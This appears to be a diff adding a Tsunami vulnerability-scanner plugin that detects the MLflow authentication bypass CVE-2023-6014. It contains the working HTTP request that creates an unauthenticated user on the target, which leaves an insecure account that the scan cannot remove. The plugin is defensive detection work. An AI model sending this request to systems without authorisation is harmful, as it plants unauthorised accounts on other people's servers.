@@ -1,0 +1,100 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLFlow_CVE_2023_6014"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " frkngksl for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2023_6014"
+  }
+  severity: CRITICAL
+  title: "MLFlow Auth Bypass Vulnerability (CVE-2023-6014)"
+  description: 
+    "On MLflow versions prior to 2.8.0, unauthenticated users are able to arbitrarily create an"
+    " account in MLflow server or MLflow UI by bypassing any authentication requirement.\n"
+  recommendation: 
+    "Update the MLflow instances to a version that provides a fix which is newer"
+    " than version 2.8.0, and check the user list for potential users that"
+    " were created by exploiting this vulnerability. Note that there are later CVEs,"
+    " so it's best to update to the latest version.\n IMPORTANT NOTE: This scan "
+    "confirmed the vulnerability by creating a user with username 'TSUNAMI_USER_<TIMESTAMP>'"
+    " and an insecure password, so make sure you delete that user."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-6014"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+# our fingerprint needs to be weak/different because a properly configured version will say auth is needed.
+
+actions: {
+  name: "fingerprint_mlflow"
+  http_request: {
+    method: GET
+    uri: "/"
+    headers: { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    response: {
+      http_status: 401
+      expect_all: {
+        conditions: [
+          { body: {} contains: 'mlflow' }
+        ]
+      }
+    }
+  }
+}
+
+# this does not use a secure password, however, if it succeeds, it means that anyone could create one anyway.
+# unfortunately even if we authenticate with these credentials it doesn't allow deleting the user we created.
+
+actions: {
+  name: "create_user"
+  http_request: {
+    method: POST
+    uri: "/api/2.0/mlflow/users/create"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/x-www-form-urlencoded"}
+    ]
+    data: "username=TSUNAMI_USER_{{ T_UTL_CURRENT_TIMESTAMP_MS }}&password={{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: 'Successfully signed up user:' }
+        ]
+      }
+    }
+  }
+  # cleanup action is not possible
+}
+
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_mlflow",
+    "create_user"
+  ]
+}
+
